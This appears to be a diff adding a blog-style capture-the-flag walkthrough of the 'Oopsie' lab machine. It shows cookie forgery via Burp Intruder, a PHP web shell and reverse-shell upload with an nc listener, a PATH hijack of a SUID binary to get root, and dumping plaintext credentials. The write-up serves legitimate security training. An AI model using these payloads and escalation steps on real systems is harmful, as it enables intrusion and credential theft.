+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>1</code></td>
+			<td>Tafcz</td>
+			<td><code>john@tafcz.co.uk</code></td>
+		</tr>
+	</tbody>
+</table>
+
+<p>I am most interested in the Accounts tab, as I hope that the table shows more if you have different request cookies or query parameters.  This is what we intercept:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cdn-cgi/login/admin.php?content=accounts&amp;id=1 HTTP/1.1
+Host: oopsie
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: user=34322; role=admin
+Connection: close
+</code></pre></div></div>
+
+<p>The request parameters are <code class="highlighter-rouge">content=accounts</code> and <code class="highlighter-rouge">id=1</code>.  We could perhaps try different <code class="highlighter-rouge">id</code>s.  I try <code class="highlighter-rouge">id=2</code> and get an empty page—but not an error!  This is good.  Perhaps a certain ID/parameter combination lets me see different accounts.  Let’s look for the super admin!  To do this, we can use Burp’s Intruder tab (<kbd>&#8984;&lt;/kbs&gt; + <kbd>I</kbd>).  Going into the Positions sub-tab, delete the curly symbols around everything except the `id`, so it should look like this:</kbd></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cdn-cgi/login/admin.php?content=accounts&amp;id=§§ HTTP/1.1
+Host: oopsie
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: user=34322; role=admin
+Connection: close
+
+</code></pre></div></div>
+
+<p>(Keep the attack type as Sniper).  Now go into the Payloads sub-tab.  We want to populate the “Payload Opions [Simple list]” section.  We can generate a list of 1000 IDs to start with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 1000<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> | pbcopy <span class="c"># or</span>
+julia <span class="nt">-e</span> <span class="s1">'[println(i) for i in 1:1000]'</span> | pbcopy <span class="c"># etc; there are many ways to skin a cat (but seriously, who skins cats?!)</span>
+</code></pre></div></div>
+
+<p>Now paste it into the aforementioned section.  Click on the Options tab and ensure that we “Always” Follow Redirections.  Also select the option to “Process cookies in redirections”.</p>
+
+<p>Going back to the Target tag, we can now press Start attack.  We slowly see the responses coming through, their lengths and their statuses, etc.  We look for any irregularities.</p>
+
+<p>Immediately, (well, after waiting a little), we see that <code class="highlighter-rouge">id=30</code> produces a different length to all the others.  Going back to Repeater [note: sending something from Proxy to Repeater, you can use the <kbd>&#8984;&lt;/kbs&gt; + <kbd>R</kbd> shortcut], we change ID=30, and we see</kbd></p>
+
+<table align="center">
+	<thead>
+		<tr>
+			<td>Access ID</td>
+			<td>Name</td>
+			<td>Email</td>
+		</tr>
+	</thead>
+	<tbody>
+		<tr>
+			<td><code>86575</code></td>
+			<td>super admin</td>
+			<td><code>superadmin@megacorp.com</code></td>
+		</tr>
+	</tbody>
+</table>
+
+<p>Now I think we can try what we were trying before with the Uploads intercept!  Intercepting the Uploads request and sending to Repeater, we change</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=34322; role=admin
+</code></pre></div></div>
+<p>to</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=86575; role=super admin
+</code></pre></div></div>
+
+<p>And show response in browser for easy access.  We can upload a file!  This is excellent, because we have done Remote Code Execution (RCE) before.  Let’s put in a simple display script, so that our request looks like this:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cdn-cgi/login/admin.php?content=uploads<span class="err">&amp;</span>action=upload HTTP/1.1
+Host: oopsie
+Content-Length: 401
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://oopsie
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxCPwDzmeB8D1ILNO
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: user=86575; role=super admin
+Connection: close
+
+------WebKitFormBoundaryxCPwDzmeB8D1ILNO
+Content-Disposition: form-data; name="name"
+
+evil
+------WebKitFormBoundaryxCPwDzmeB8D1ILNO
+Content-Disposition: form-data; name="fileToUpload"; filename="display.php"
+Content-Type: text/php
+
+<span class="nt">&lt;html&gt;&lt;head&gt;&lt;title&gt;</span>Display a file<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="cp">&lt;? echo system("cat ".$_GET[’file’]); ?&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+------WebKitFormBoundaryxCPwDzmeB8D1ILNO--
+</code></pre></div></div>
+
+<p>This uploaded successfully (which is good, because they haven’t checked for file extensions!).</p>
+
+<p>Recall that we say an <code class="highlighter-rouge">uploads</code> directory from <code class="highlighter-rouge">gobusters</code> earlier!  Let’s try uploading a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell PHP file</a> on:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cdn-cgi/login/admin.php?content=uploads<span class="err">&amp;</span>action=upload HTTP/1.1
+Host: oopsie
+Content-Length: 6371
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://oopsie
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://oopsie/cdn-cgi/login/admin.php?content=uploads
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: user=86575; role=super admin
+Connection: close
+
+------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+Content-Disposition: form-data; name="name"
+
+evil2
+------WebKitFormBoundaryQG5MQDvEzdbIdQ1i
+Content-Disposition: form-data; name="fileToUpload"; filename="php-reverse-shell.php"
+Content-Type: text/php
+
+<span class="cp">&lt;?php</span>
+<span class="mf">...</span>
+<span class="cp">?&gt;</span>
+------WebKitFormBoundaryQG5MQDvEzdbIdQ1i--
+</code></pre></div></div>
+
+<p>We upload this as <code class="highlighter-rouge">php-reverse-shell.php</code>.  Now we run the classic <code class="highlighter-rouge">nc6 -nlvp 1234</code> in one tab, and in another, run <code class="highlighter-rouge">curl http://oopsie/uploads/php-reverse-shell.php</code>.  In the listener tab, we have a reverse shell!</p>
+
+<p>Now we are in, let’s see where we are and what is here:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@oopsie:/var/www/html/cdn-cgi/login<span class="nv">$ </span><span class="nb">pwd
+pwd</span>
+/var/www/html/cdn-cgi/login
+www-data@oopsie:/var/www/html/cdn-cgi/login<span class="nv">$ </span><span class="nb">ls
+ls
+</span>admin.php  db.php  index.php  script.js
+www-data@oopsie:/var/www/html/cdn-cgi/login<span class="nv">$ </span><span class="nb">cat </span>db.php
+<span class="nb">cat </span>db.php
+&lt;?php
+<span class="nv">$conn</span> <span class="o">=</span> mysqli_connect<span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'robert'</span>,<span class="s1">'M3g4C0rpUs3r!'</span>,<span class="s1">'garage'</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p>We log in as our friend Bob to actually run the executable:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>su robert
+su: must be run from a terminal
+</code></pre></div></div>
+
+<p>Okay, well we can do some tricks to the web shell to make it a little nicer:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p>Note: since completing this box, I have found another way of doing this:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">SHELL</span><span class="o">=</span>/bin/bash script <span class="nt">-q</span> /dev/null
+Ctrl-Z
+<span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg
+</span>reset
+xterm
+</code></pre></div></div>
+
+<p>Now that we have a terminal, we can login as Robert, using the above credentials:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@oopsie:/<span class="nv">$ </span>su robert
+su robert
+Password: M3g4C0rpUs3r!
+
+robert@oopsie:/<span class="nv">$ </span><span class="nb">ls
+ls
+</span>bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
+boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
+cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
+robert@oopsie:/<span class="nv">$ </span><span class="nb">cd </span>home
+<span class="nb">cd </span>home
+robert@oopsie:/home<span class="nv">$ </span><span class="nb">ls
+ls
+</span>robert
+robert@oopsie:/home<span class="nv">$ </span><span class="nb">cd </span>robert
+<span class="nb">cd </span>robert
+robert@oopsie:~<span class="nv">$ </span><span class="nb">ls
+ls
+cat  </span>LinEnum.sh  user.txt
+robert@oopsie:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat </span>user.txt
+f2c7<span class="k">************************</span>7981
+</code></pre></div></div>
+
+<p>And we have the user flag!  But I also notice an attractive-looking shell script in there…let’s run it and see:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#########################################################</span>
+<span class="c"># Local Linux Enumeration &amp; Privilege Escalation Script #</span>
+<span class="c">#########################################################</span>
+<span class="c"># www.rebootuser.com</span>
+<span class="c"># version 0.982</span>
+
+<span class="o">[</span>-] Debug Info
+<span class="o">[</span>+] Thorough tests <span class="o">=</span> Disabled
+
+
+Scan started at:
+Wed Apr  7 12:36:19 UTC 2021
+
+
+<span class="c">### SYSTEM ##############################################</span>
+
+...
+
+<span class="o">[</span>-] Hostname:
+oopsie
+
+
+<span class="c">### USER/GROUP ##########################################</span>
+<span class="o">[</span>-] Current user/group info:
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>robert<span class="o">)</span>,1001<span class="o">(</span>bugtracker<span class="o">)</span>
+
+...
+
+<span class="c">### INTERESTING FILES ####################################</span>
+
+...
+
+<span class="o">[</span>-] SUID files:
+
+...
+
+<span class="nt">-rwsr-xr--</span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+...
+
+<span class="c">### SCAN COMPLETE ####################################</span>
+</code></pre></div></div>
+
+<p>First notice that Robert is part of a group called <code class="highlighter-rouge">bugtracker</code>.  Further down, under the Interesting Files header, we find a <code class="highlighter-rouge">bugtracker</code> executable:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rwsr-xr--</span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+</code></pre></div></div>
+
+<p>Interesting!  Running this, we get a prompt to provide bug ID.  Providing it with bug ID <code class="highlighter-rouge">1</code>, we get</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:~<span class="nv">$ </span>bugtracker
+bugtracker
+
+<span class="nt">------------------</span>
+: EV Bug Tracker :
+<span class="nt">------------------</span>
+
+Provide Bug ID: 1
+1
+<span class="nt">---------------</span>
+
+Binary package hint: ev-engine-lib
+
+Version: 3.3.3-1
+
+Reproduce:
+When loading library <span class="k">in </span>firmware it seems to be crashed
+
+What you expected to happen:
+Synchronized browsing to be enabled since it is enabled <span class="k">for </span>that site.
+
+What happened instead:
+Synchronized browsing is disabled. Even choosing VIEW <span class="o">&gt;</span> SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
+</code></pre></div></div>
+
+<p>There seem to be two other bugs, but no fourth (and presumable no fifth, etc.).</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:~<span class="nv">$ </span>bugtracker
+bugtracker
+
+<span class="nt">------------------</span>
+: EV Bug Tracker :
+<span class="nt">------------------</span>
+
+Provide Bug ID: 4
+4
+<span class="nt">---------------</span>
+
+<span class="nb">cat</span>: /root/reports/4: No such file or directory
+
+robert@oopsie:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Unfortunately the executable is compiled, but from the above <code class="highlighter-rouge">cat</code> error we can gleam that <code class="highlighter-rouge">cat</code> is used to print some report file.  What we can do is something very clever: create our own <code class="highlighter-rouge">cat</code> executable and give it priority in path so that the <code class="highlighter-rouge">bugtracker</code> command uses this instead!  If our own cat creates a shell of its own, then we will have root privileges!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:~<span class="nv">$ </span><span class="nb">cd</span> /tmp
+<span class="nb">cd</span> /tmp
+robert@oopsie:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+robert@oopsie:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash'</span> <span class="o">&gt;</span> <span class="nb">cat</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="nb">cat
+echo</span> <span class="s1">'/bin/sh'</span> <span class="o">&gt;</span> <span class="nb">cat</span> <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x <span class="nb">cat</span>
+</code></pre></div></div>
+
+<p>Now running <code class="highlighter-rouge">bugtracker</code> once more we look to have silent success:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/tmp<span class="nv">$ </span>bugtracker
+bugtracker
+
+<span class="nt">------------------</span>
+: EV Bug Tracker :
+<span class="nt">------------------</span>
+
+Provide Bug ID: 1
+1
+<span class="nt">---------------</span>
+
+root@oopsie:/tmp#
+</code></pre></div></div>
+
+<p>Indeed, we are now a root user!  We can collect our flag and leave at once.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@oopsie:/tmp# <span class="nb">whoami
+whoami
+</span>root
+root@oopsie:/tmp# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@oopsie:/root# <span class="nb">ls</span> <span class="nt">-A</span>
+<span class="nb">ls</span> <span class="nt">-A</span>
+.bash_history  .cache	.gnupg	.profile  root.txt  .viminfo
+.bashrc        .config	.local	reports   .ssh
+root@oopsie:/root# <span class="nv">PATH</span><span class="o">=</span><span class="si">$(</span>getconf PATH<span class="si">)</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="si">$(</span>getconf PATH<span class="si">)</span>
+root@oopsie:/root# <span class="nb">cat </span>root.txt
+<span class="nb">cat </span>root.txt
+af13b0bee69f8a877c3faf667f7beacf
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="notes">Notes</h2>
+
+<p>I got a little nudge for the final step of this.  But boy, this is a simple solution.  I had never thought of this before, and it is ever-so clever!</p>
+
+<p>Another quick note: because this box used something from the previous box, I had a little look around, especially in this root directory:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># find . -type f | while IFS= read -r line; do echo "\n\n\033[1;38m$line\033[0;38m"; cat "$line"; done</span>
+find <span class="nb">.</span> <span class="nt">-type</span> f | <span class="k">while </span><span class="nv">IFS</span><span class="o">=</span> <span class="nb">read</span> <span class="nt">-r</span> line<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="se">\n\n\0</span><span class="s2">33[1;38m</span><span class="nv">$line</span><span class="se">\0</span><span class="s2">33[0;38m"</span><span class="p">;</span> <span class="nb">cat</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+
+...
+
+./.config/filezilla/filezilla.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span> ?&gt;
+&lt;FileZilla3&gt;
+    &lt;RecentServers&gt;
+        &lt;Server&gt;
+            &lt;Host&gt;10.10.10.46&lt;/Host&gt;
+            &lt;Port&gt;21&lt;/Port&gt;
+            &lt;Protocol&gt;0&lt;/Protocol&gt;
+            &lt;Type&gt;0&lt;/Type&gt;
+            &lt;User&gt;ftpuser&lt;/User&gt;
+            &lt;Pass&gt;mc@F1l3ZilL4&lt;/Pass&gt;
+            &lt;Logontype&gt;1&lt;/Logontype&gt;
+            &lt;TimezoneOffset&gt;0&lt;/TimezoneOffset&gt;
+            &lt;PasvMode&gt;MODE_DEFAULT&lt;/PasvMode&gt;
+            &lt;MaximumMultipleConnections&gt;0&lt;/MaximumMultipleConnections&gt;
+            &lt;EncodingType&gt;Auto&lt;/EncodingType&gt;
+            &lt;BypassProxy&gt;0&lt;/BypassProxy&gt;
+        &lt;/Server&gt;
+    &lt;/RecentServers&gt;
+&lt;/FileZilla3&gt;
+</code></pre></div></div>
+
+<p>Good to note that there is a username and password in plain text here in this last file we found.</p>
 
           </div>
           <div class="article-share">
